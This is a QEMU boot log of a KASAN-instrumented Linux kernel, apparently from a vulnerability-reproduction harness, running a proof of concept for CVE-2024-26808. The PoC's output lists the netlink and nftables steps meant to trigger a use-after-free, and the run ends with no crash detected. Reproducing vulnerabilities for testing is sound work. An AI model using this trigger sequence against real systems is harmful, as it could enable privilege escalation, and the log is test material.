bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 5.15.148+ (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #2 SMP Tue May 5 13:09:56 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] tsc: Fast TSC calibration using PIT
[    0.000000] tsc: Detected 3186.877 MHz processor
[    0.000283] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000308] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002085] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002099] Using GB pages for direct mapping
[    0.002100] Incomplete global flushes, disabling PCID
[    0.002224] RAMDISK: [mem 0x7fe92000-0x7ffdffff]
[    0.002229] ACPI: Early table checksum verification disabled
[    0.002232] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002236] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002241] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002246] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002249] ACPI: FACS 0x000000007FFE0000 000040
[    0.002251] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002253] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002256] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002258] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002259] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002260] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002261] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002262] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002263] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002436] No NUMA configuration found
[    0.002437] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002441] NODE_DATA(0) allocated [mem 0x7fe8e000-0x7fe91fff]
[    0.002452] Zone ranges:
[    0.002453]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002455]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002456]   Normal   empty
[    0.002457] Movable zone start for each node
[    0.002458] Early memory node ranges
[    0.002459]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002460]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002462] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.002632] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.002677] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.010965] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.039435] kasan: KernelAddressSanitizer initialized
[    0.039662] ACPI: PM-Timer IO Port: 0x608
[    0.039670] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.039698] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.039700] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.039702] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.039704] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.039705] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.039706] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.039708] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.039709] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.039712] TSC deadline timer available
[    0.039714] smpboot: Allowing 2 CPUs, 0 hotplug CPUs
[    0.039723] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.039724] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x0009ffff]
[    0.039725] PM: hibernation: Registered nosave memory: [mem 0x000a0000-0x000effff]
[    0.039726] PM: hibernation: Registered nosave memory: [mem 0x000f0000-0x000fffff]
[    0.039728] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.039731] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.046869] setup_percpu: NR_CPUS:64 nr_cpumask_bits:64 nr_cpu_ids:2 nr_node_ids:1
[    0.047114] percpu: Embedded 64 pages/cpu s224152 r8192 d29800 u1048576
[    0.047139] Built 1 zonelists, mobility grouping on.  Total pages: 515808
[    0.047141] Policy zone: DMA32
[    0.047143] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.047378] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.047452] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.047478] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.069407] Memory: 1699988K/2096632K available (45069K kernel code, 7374K rwdata, 8152K rodata, 2032K init, 3628K bss, 396388K reserved, 0K cma-reserved)
[    0.069499] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.069772] rcu: Hierarchical RCU implementation.
[    0.069774] rcu: 	RCU event tracing is enabled.
[    0.069775] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.069777] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.069779] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.072743] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.072919] random: crng init done
[    0.075349] Console: colour VGA+ 80x25
[    0.106152] printk: console [ttyS0] enabled
[    0.106393] ACPI: Core revision 20210730
[    0.106722] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.107270] APIC: Switch to symmetric I/O mode setup
[    0.108097] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.113264] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2defdd70d37, max_idle_ns: 440795302138 ns
[    0.113888] Calibrating delay loop (skipped), value calculated using timer frequency.. 6373.75 BogoMIPS (lpj=3186877)
[    0.114952] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.115352] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.115643] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.115887] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.116347] Spectre V2 : Mitigation: Enhanced IBRS
[    0.116883] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch
[    0.117328] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.117736] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.117883] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl and seccomp
[    0.118401] MMIO Stale Data: Unknown: No mitigations
[    0.118898] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.119324] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.119680] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.119883] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.120335] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.120883] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.121235] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.134261] Freeing SMP alternatives memory: 44K
[    0.134582] pid_max: default: 32768 minimum: 301
[    0.134876] LSM: Security Framework initializing
[    0.134896] SELinux:  Initializing.
[    0.135142] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.135561] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.136202] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.136883] Performance Events: unsupported p6 CPU model 183 no PMU driver, software events only.
[    0.136898] signal: max sigframe size: 3632
[    0.137155] rcu: Hierarchical SRCU implementation.
[    0.137711] smp: Bringing up secondary CPUs ...
[    0.137977] x86: Booting SMP configuration:
[    0.138215] .... node  #0, CPUs:      #1
[    0.138512] smp: Brought up 1 node, 2 CPUs
[    0.138886] smpboot: Max logical packages: 1
[    0.139127] smpboot: Total of 2 processors activated (12747.50 BogoMIPS)
[    0.139746] devtmpfs: initialized
[    0.140702] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.140888] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.141351] PM: RTC time: 13:12:17, date: 2026-05-05
[    0.141743] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.142040] audit: initializing netlink subsys (disabled)
[    0.142535] audit: type=2000 audit(1777986737.034:1): state=initialized audit_enabled=0 res=1
[    0.142535] thermal_sys: Registered thermal governor 'step_wise'
[    0.142886] thermal_sys: Registered thermal governor 'user_space'
[    0.143258] cpuidle: using governor menu
[    0.143489] ACPI: bus type PCI registered
[    0.143994] PCI: Using configuration type 1 for base access
[    0.149880] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.149928] HugeTLB registered 2.00 MiB page size, pre-allocated 0 pages
[    0.150309] cryptomgr_test (27) used greatest stack depth: 30496 bytes left
[    0.151066] ACPI: Added _OSI(Module Device)
[    0.151887] ACPI: Added _OSI(Processor Device)
[    0.152140] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.152416] ACPI: Added _OSI(Processor Aggregator Device)
[    0.152726] ACPI: Added _OSI(Linux-Dell-Video)
[    0.152972] ACPI: Added _OSI(Linux-Lenovo-NV-HDMI-Audio)
[    0.153274] ACPI: Added _OSI(Linux-HPI-Hybrid-Graphics)
[    0.158824] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.160256] ACPI: Interpreter enabled
[    0.160494] ACPI: PM: (supports S0 S3 S4 S5)
[    0.160738] ACPI: Using IOAPIC for interrupt routing
[    0.160912] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.161710] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.170480] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.170839] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.170923] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended PCI configuration space under this bridge.
[    0.171664] PCI host bridge to bus 0000:00
[    0.171886] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.172269] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.172653] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.172885] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.173315] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.173745] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.174310] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000
[    0.178229] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100
[    0.182114] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180
[    0.183282] pci 0000:00:01.1: reg 0x20: [io  0xc040-0xc04f]
[    0.183895] pci 0000:00:01.1: legacy IDE quirk: reg 0x10: [io  0x01f0-0x01f7]
[    0.184298] pci 0000:00:01.1: legacy IDE quirk: reg 0x14: [io  0x03f6]
[    0.184663] pci 0000:00:01.1: legacy IDE quirk: reg 0x18: [io  0x0170-0x0177]
[    0.184884] pci 0000:00:01.1: legacy IDE quirk: reg 0x1c: [io  0x0376]
[    0.185776] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000
[    0.186101] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.186508] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.187593] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000
[    0.188427] pci 0000:00:02.0: reg 0x10: [mem 0xfd000000-0xfdffffff pref]
[    0.189316] pci 0000:00:02.0: reg 0x18: [mem 0xfebf0000-0xfebf0fff]
[    0.190890] pci 0000:00:02.0: reg 0x30: [mem 0xfebe0000-0xfebeffff pref]
[    0.191318] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.195231] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000
[    0.196008] pci 0000:00:03.0: reg 0x10: [mem 0xfebc0000-0xfebdffff]
[    0.196539] pci 0000:00:03.0: reg 0x14: [io  0xc000-0xc03f]
[    0.197885] pci 0000:00:03.0: reg 0x30: [mem 0xfeb80000-0xfebbffff pref]
[    0.202095] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.202763] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.203160] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.203774] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.203995] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.205099] iommu: Default domain type: Translated 
[    0.205633] iommu: DMA domain TLB invalidation policy: lazy mode 
[    0.205935] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.206242] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.206710] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.206889] vgaarb: loaded
[    0.207206] SCSI subsystem initialized
[    0.207462] ACPI: bus type USB registered
[    0.207462] usbcore: registered new interface driver usbfs
[    0.207904] usbcore: registered new interface driver hub
[    0.208219] usbcore: registered new device driver usb
[    0.208541] pps_core: LinuxPPS API ver. 1 registered
[    0.208831] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.208891] PTP clock support registered
[    0.209155] Advanced Linux Sound Architecture Driver Initialized.
[    0.209537] NetLabel: Initializing
[    0.209884] NetLabel:  domain hash size = 128
[    0.210137] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.210480] NetLabel:  unlabeled traffic allowed by default
[    0.210895] PCI: Using ACPI for IRQ routing
[    0.211227] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.211509] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.213928] clocksource: Switched to clocksource tsc-early
[    0.244034] VFS: Disk quotas dquot_6.6.0
[    0.244308] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.244815] pnp: PnP ACPI init
[    0.245976] pnp: PnP ACPI: found 6 devices
[    0.252848] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.253433] NET: Registered PF_INET protocol family
[    0.253777] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.254471] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.254974] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.255450] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.255941] TCP bind hash table entries: 16384 (order: 6, 262144 bytes, linear)
[    0.256383] TCP: Hash tables configured (established 16384 bind 16384)
[    0.256802] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.257201] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.257676] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.258994] RPC: Registered named UNIX socket transport module.
[    0.259351] RPC: Registered udp transport module.
[    0.259639] RPC: Registered tcp transport module.
[    0.259935] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.260576] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.260963] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.261340] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.261750] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.262165] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.262668] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.263016] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.263364] pci 0000:00:01.0: Activating ISA DMA hang workarounds
[    0.263736] PCI: CLS 0 bytes, default 64
[    0.264164] Unpacking initramfs...
[    0.277855] Freeing initrd memory: 1336K
[    0.290312] Initialise system trusted keyrings
[    0.290670] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.295590] NFS: Registering the id_resolver key type
[    0.295897] Key type id_resolver registered
[    0.296141] Key type id_legacy registered
[    0.300405] Key type asymmetric registered
[    0.300691] Asymmetric key parser 'x509' registered
[    0.301035] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.301456] io scheduler mq-deadline registered
[    0.301717] io scheduler kyber registered
[    0.302280] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.302776] ACPI: button: Power Button [PWRF]
[    0.303344] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.303779] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.304681] Non-volatile memory driver v1.3
[    0.304961] Linux agpgart interface v0.103
[    0.307903] loop: module loaded
[    0.309015] scsi host0: ata_piix
[    0.309407] scsi host1: ata_piix
[    0.309663] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14
[    0.310057] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15
[    0.310950] e100: Intel(R) PRO/100 Network Driver
[    0.311271] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.311594] e1000: Intel(R) PRO/1000 Network Driver
[    0.311874] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.468957] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.469972] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.589321] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.589717] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.596156] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    0.605908] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.885344] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    0.885750] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    0.886182] e1000e: Intel(R) PRO/1000 Network Driver
[    0.886467] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    0.886831] sky2: driver version 1.30
[    0.887281] ehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver
[    0.887664] ehci-pci: EHCI PCI platform driver
[    0.888057] ohci_hcd: USB 1.1 'Open' Host Controller (OHCI) Driver
[    0.888418] ohci-pci: OHCI PCI platform driver
[    0.888682] uhci_hcd: USB Universal Host Controller Interface driver
[    0.889137] usbcore: registered new interface driver usblp
[    0.889466] usbcore: registered new interface driver usb-storage
[    0.889853] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    0.890755] serio: i8042 KBD port at 0x60,0x64 irq 1
[    0.891045] serio: i8042 AUX port at 0x60,0x64 irq 12
[    0.891564] rtc_cmos 00:05: RTC can wake from S4
[    0.891941] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    0.893648] rtc_cmos 00:05: registered as rtc0
[    0.893967] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    0.894556] device-mapper: ioctl: 4.45.0-ioctl (2021-03-22) initialised: dm-devel@redhat.com
[    0.895041] intel_pstate: CPU model not supported
[    0.895356] hid: raw HID events driver (C) Jiri Kosina
[    0.895866] usbcore: registered new interface driver usbhid
[    0.896188] usbhid: USB HID core driver
[    0.897035] Initializing XFRM netlink socket
[    0.897502] NET: Registered PF_INET6 protocol family
[    0.898268] Segment Routing with IPv6
[    0.898500] In-situ OAM (IOAM) with IPv6
[    0.898796] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    0.899340] NET: Registered PF_PACKET protocol family
[    0.899657] Key type dns_resolver registered
[    0.900138] IPI shorthand broadcast: enabled
[    0.900415] sched_clock: Marking stable (865091270, 34974910)->(911216528, -11150348)
[    0.901036] registered taskstats version 1
[    0.901272] Loading compiled-in X.509 certificates
[    0.901714] PM:   Magic number: 10:913:229
[    0.901994] printk: console [netcon0] enabled
[    0.902246] netconsole: network logging started
[    0.902638] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    0.903275] kworker/u4:1 (71) used greatest stack depth: 29392 bytes left
[    0.904066] cfg80211: Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    0.904548] cfg80211: Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    0.905027] ALSA device list:
[    0.905200]   No soundcards found.
[    0.905828] Freeing unused kernel image (initmem) memory: 2032K
[    0.906239] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    0.906734] cfg80211: failed to load regulatory.db
[    0.907935] Write protecting the kernel read-only data: 55296k
[    0.908567] Freeing unused kernel image (text/rodata gap) memory: 2032K
[    0.908974] Freeing unused kernel image (rodata/data gap) memory: 40K
[    0.909376] Run /init as init process
[    0.910427] mount (76) used greatest stack depth: 28744 bytes left
[    0.910824] mount (77) used greatest stack depth: 28712 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting CVE-2024-26808 trigger
poc: userns ready (CAP_NET_ADMIN acquired)
poc: NETLINK_ROUTE fd=3 NETLINK_NETFILTER fd=4
poc: RTM_NEWLINK uaf0 (dummy, ifindex=1337)
poc: NFT_MSG_NEWTABLE inet t
poc: NFT_MSG_NEWCHAIN inet/ingress c dev=uaf0
poc: RTM_DELLINK uaf0 (net_device freed; hook->ops.dev dangling)
poc: NFT_MSG_GETCHAIN (expect KASAN use-after-free in nft_dump_basechain_hook)
[    1.292175] tsc: Refined TSC clocksource calibration: 3187.042 MHz
[    1.292546] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df07909034, max_idle_ns: 440795315705 ns
[    1.293157] clocksource: Switched to clocksource tsc
[    1.516612] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
poc: done (no crash observed)
[    2.724434] poc (82) used greatest stack depth: 25640 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    3.951823] ACPI: PM: Preparing to enter system sleep state S5
[    3.952252] reboot: Power down
NO_CRASH_DETECTED
